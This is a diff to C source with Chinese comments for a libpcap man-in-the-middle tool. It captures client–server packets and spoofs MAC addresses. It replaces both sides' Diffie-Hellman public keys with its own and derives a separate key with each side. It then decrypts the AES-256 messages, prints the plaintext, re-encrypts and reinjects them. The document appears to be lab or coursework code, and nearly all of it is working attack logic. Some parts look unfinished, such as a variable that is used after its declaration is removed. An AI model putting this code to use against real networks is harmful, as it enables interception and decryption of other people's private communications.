@@ -28,11 +28,11 @@ typedef struct psd_header
     unsigned short tcp_len; // TCP长度
 } psd_header;
 
-void process_pkt(IP_T *ip_t);
+void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet);
 uint16_t calc_checksum(void *pkt, int len);
 void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len);
 
-int main(int argc, char *argv)
+int main(int argc, char **argv)
 {
     if (argc != 3)
     {
@@ -40,8 +40,7 @@ int main(int argc, char *argv)
         return 0;
     }
 
-    Middle_DH_Key middle_dh; // 与服务器/客户端进行DH通信的结构体
-    pcap_t *descr = NULL;    // 数据包捕获描述字
+    pcap_t *descr = NULL; // 数据包捕获描述字
     int i = 0, cnt = 0;
     char errbuf[PCAP_ERRBUF_SIZE]; // 存放错误信息
     char *device = NULL;           // 网络设备名指针
@@ -70,7 +69,7 @@ int main(int argc, char *argv)
 
     // 设置BPF过滤规则
     char rule[128];
-    bzero(rule, 128);
+    memset(rule, 0, 128);
     strncat(rule, "(src host ", 10);
     strncat(rule, argv[1], strlen(argv[1])); // (src host ClientIP
     strncat(rule, " and dst host ", 14);
@@ -80,6 +79,7 @@ int main(int argc, char *argv)
     strncat(rule, " and dst host ", 14);
     strncat(rule, argv[1], strlen(argv[1])); // and dst host ClientIP
     strncat(rule, ")", 1);
+    // printf("%s\n", rule);
     // (src host ClientIP and dst host ServerIP) or
     // (src host ServerIP and dst host ClientIP)
 
@@ -106,8 +106,8 @@ int main(int argc, char *argv)
     memcpy(ip_t.server_ip, argv[2], strlen(argv[2]));
 
     // 循环抓包并按照函数proccess_pkt处理, ip_t为参数
-    if (pcap_loop(descr, -1, process_pkt, &ip_t) == -1)
-    { // TODO: 参数传递可能出问题
+    if (pcap_loop(descr, -1, process_pkt, (u_char *)&ip_t) == -1)
+    {
         fprintf(stderr, "ERROR at pcap_loop()\n");
         exit(1);
     }
@@ -118,59 +118,57 @@ int main(int argc, char *argv)
 }
 
 // 每抓到一个数据报后的回调函数
-void process_pkt(IP_T *ip_t)
+void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet)
 {
-    const struct pcap_pkthdr *pkthdr; // 包含了抓到的数据包的信息
-    const u_char packet;              // 数据包数据
-    char src_ip[16];                  // 源IP
-    unsigned char server_mac[] = {};  // 服务器mac
-    unsigned char client_mac[] = {};  // 客户端mac
-    unsigned char middle_mac[] = {};  // 中间人mac
+    unsigned char src_ip[16];                                          // 源IP
+    unsigned char server_mac[] = {0x00, 0x0c, 0x29, 0x54, 0x89, 0x77}; // 服务器mac
+    unsigned char client_mac[] = {0x00, 0x0c, 0x29, 0xd7, 0xe2, 0xf9}; // 客户端mac
+    unsigned char middle_mac[] = {0x00, 0x0c, 0x29, 0x89, 0xa0, 0xf6}; // 中间人mac
 
-    unsigned char key2server[33];                // 对服务器的密钥
-    unsigned char key2client[33];                // 对客户端的密钥
+    unsigned char key2server[32];                // 对服务器的密钥
+    unsigned char key2client[32];                // 对客户端的密钥
     unsigned char expansion_key2server[15 * 16]; // 对服务器的扩展密钥
     unsigned char expansion_key2client[15 * 16]; // 对客户端的扩展密钥
-    unsigned char plain_text[36];                // 明文
+    unsigned char plain_text[33];                // 明文
 
     struct ether_header *ethernet = (struct ether_header *)(packet); // 以太网帧头部
     struct iphdr *ip = (struct iphdr *)(packet + ETHER_HDR_LEN);     //IP头
     struct tcphdr *tcp = (struct tcphdr *)(packet + ETHER_HDR_LEN +
                                            sizeof(struct iphdr)); //tcp头
-
     int header_len = ETHER_HDR_LEN + sizeof(struct iphdr) +
                      sizeof(struct tcphdr) + 12; // 数据包头部长度
     int data_len = pkthdr->len - header_len;     // 数据包数据真实长度
     bzero(src_ip, 16);
     inet_ntop(AF_INET, &(ip->saddr), src_ip, 16); // 源地址存入src_ip
     memcpy(ethernet->ether_shost, middle_mac, 6); // 用中间人MAC替换源地址MAC
-
     // 若捕获到的是客户端发出的数据包
     if (strncmp(src_ip, ip_t->client_ip, strlen(src_ip)) == 0)
     {
         // 若发送的是素数p，则自己保存
         if (strncmp(packet + header_len, "pri", 3) == 0)
+        {
             mpz_set_str(middle_dh.p, packet + header_len + 3, 16);
-
+            // printf("p: %Zd\n", middle_dh.p);
+        }
         // 若发送的是客户端公钥，则先计算出对客户端的密钥
         // 然后生成自己的私钥，并计算公钥发送给服务器
         else if (strncmp(packet + header_len, "pub", 3) == 0)
         {
+            // printf("抓到客户端公钥！\n\n");
             mpz_t client_pub_key;
             // 保存客户端公钥
             mpz_init_set_str(client_pub_key, packet + header_len + 3, 16);
             // 计算对客户端的密钥
-            mpz_pown(middle_dh.key2client, client_pub_key, middle_dh.pri_key,
+            mpz_powm(middle_dh.key2client, client_pub_key, middle_dh.pri_key,
                      middle_dh.p);
+            // gmp_printf("对客户端的密钥为%Zd\n", middle_dh.key2client);
             // 保存对客户端的密钥
             mpz_get_str(key2client, 16, middle_dh.key2client);
             // 密钥扩展
             ScheduleKey(key2client, expansion_key2client, AES256_KEY_LENGTH, AES256_ROUND);
 
             // 写入中间人自己的公钥
-            unsigned char middle_pub_key[128];
-            mpz_get_str(middle_pub_key, 16, middle_dh.pub_key);
-            memcpy(packet + header_len + 3, middle_pub_key, sizeof(middle_pub_key));
+            mpz_get_str(packet + header_len + 3, 16, middle_dh.pub_key);
 
             // 重新计算校验和
             uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
@@ -183,18 +181,22 @@ void process_pkt(IP_T *ip_t)
             memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
             u_int16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
             tcp->check = checksum;
+            // printf("已对客户端公钥进行处理！\n\n");
         }
         // 若发送的是加密消息
         else if (strncmp(packet + header_len, "msg", 3) == 0)
         {
             // 解密消息，输出
-            char *buf = packet + header_len;
-            bzero(plain_text, sizeof(buf));
-            Contrary_AesEncrypt(buf, expansion_key2client, AES256_ROUND);
-            printf("客户端->服务器，明文：%s\n", buf);
+            // printf("抓到客户端发往服务器的加密消息!\n\n");
+            char *buf = packet + header_len + 3;
+            bzero(plain_text, 33);
+            strncpy(plain_text, buf, 32);
+            Contrary_AesEncrypt(plain_text, expansion_key2client, AES256_ROUND);
+            printf("客户端->服务器，明文：%s\n\n", plain_text);
 
-            // 加密消息，使用对服务器的密钥
-            AesEncrypt(buf, expansion_key2server, AES256_ROUND);
+            // 使用对服务器的密钥加密消息
+            AesEncrypt(plain_text, expansion_key2server, AES256_ROUND);
+            memcpy(packet + header_len + 3, plain_text, sizeof(plain_text));
 
             // 计算校验和
             uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
@@ -208,6 +210,7 @@ void process_pkt(IP_T *ip_t)
             memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
             uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
             tcp->check = checksum;
+            // printf("已对客户端发往服务器的消息进行处理！\n\n");
         }
         // 以太网帧头部目的地设置为服务器MAC
         memcpy(ethernet->ether_dhost, server_mac, 6);
@@ -219,28 +222,25 @@ void process_pkt(IP_T *ip_t)
         // 并且需要生成中间人自己的私钥和公钥
         if (strncmp(packet + header_len, "pub", 3) == 0)
         {
+            // printf("已收到服务器公钥!\n");
             mpz_t server_pub_key; // 来自服务器的公钥
             // 将服务器的公钥保存到server_pub_key
             mpz_init_set_str(server_pub_key, packet + header_len + 3, 16);
             generate_pri_key(middle_dh.pri_key); // 生成中间人自己的私钥
-            // 计算中间人的公钥
+            // 计算中间人的公钥, g^b mod p
             mpz_powm(middle_dh.pub_key, middle_dh.g, middle_dh.pri_key,
                      middle_dh.p);
-            // 计算对服务器的密钥
+            // 计算对服务器的密钥, B^c mod p
             mpz_powm(middle_dh.key2server, server_pub_key, middle_dh.pri_key,
                      middle_dh.p);
+            // gmp_printf("对服务器的密钥为%Zd\n", middle_dh.key2server);
             // 保存对服务器的密钥
             mpz_get_str(key2server, 16, middle_dh.key2server);
             // 密钥扩展
+            //ScheduleKey(key2client, expansion_key2client, AES256_KEY_LENGTH, AES256_ROUND);
             ScheduleKey(key2server, expansion_key2server, AES256_KEY_LENGTH, AES256_ROUND);
-
-            // 将自制数据包的目的地改为客户端MAC
-            // TODO:不知道为什么
-            memcpy(ethernet->ether_dhost, client_mac, 6);
-            unsigned char middle_pub_key[64]; // 中间人的公钥
-            mpz_get_str(middle_pub_key, 16, middle_dh.pub_key);
-            memcpy(packet + header_len + 3, middle_pub_key,
-                   sizeof(middle_pub_key));
+            // 写入中间人自己的公钥
+            mpz_get_str(packet + header_len + 3, 16, middle_dh.pub_key);
 
             // 重新计算校验和
             uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
@@ -254,17 +254,21 @@ void process_pkt(IP_T *ip_t)
             memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
             uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
             tcp->check = checksum;
+            // printf("已对服务器公钥进行处理！\n\n");
         }
         // 若发送的是加密消息
         else if (strncmp(packet + header_len, "msg", 3) == 0)
         {
-            char *buf = packet + header_len;
-            bzero(plain_text, sizeof(buf));
-            Contrary_AesEncrypt(buf, expansion_key2server, AES256_ROUND);
-            printf("服务器->客户端，明文：%s\n", buf);
+            // printf("已收到服务器发往客户端的加密消息！\n\n");
+            char *buf = packet + header_len + 3;
+            bzero(plain_text, 33);
+            strncpy(plain_text, buf, 32);
+            Contrary_AesEncrypt(plain_text, expansion_key2server, AES256_ROUND);
+            printf("服务器->客户端，明文：%s\n\n", plain_text);
 
             // 加密消息，使用对服务器的密钥
-            AesEncrypt(buf, expansion_key2client, AES256_ROUND);
+            AesEncrypt(plain_text, expansion_key2client, AES256_ROUND);
+            memcpy(packet + header_len + 3, plain_text, sizeof(plain_text));
 
             // 计算校验和
             uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
@@ -278,10 +282,10 @@ void process_pkt(IP_T *ip_t)
             memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
             uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
             tcp->check = checksum;
+            // printf("已对服务器发往客户端的加密消息进行处理!\n\n");
         }
         memcpy(ethernet->ether_dhost, client_mac, 6);
     }
-
     pcap_sendpacket(ip_t->p, packet, pkthdr->len);
 }
 
